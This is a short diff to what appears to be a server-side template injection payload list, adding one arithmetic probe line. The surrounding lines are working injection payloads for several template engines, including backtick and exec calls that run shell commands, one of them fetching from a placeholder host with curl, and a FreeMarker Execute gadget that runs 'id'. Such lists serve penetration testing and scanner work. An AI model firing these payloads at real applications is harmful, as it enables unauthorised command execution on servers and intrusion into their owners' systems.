@@ -12,6 +12,7 @@
 <%= `ls -la` %>
 <%= exec('curl http://x.x.x.x') %>
 ${7*7}
+${{4*9}}
 ${7*'7'}
 #{7*7}
 ${"freemarker.template.utility.Execute"?new()("id")}
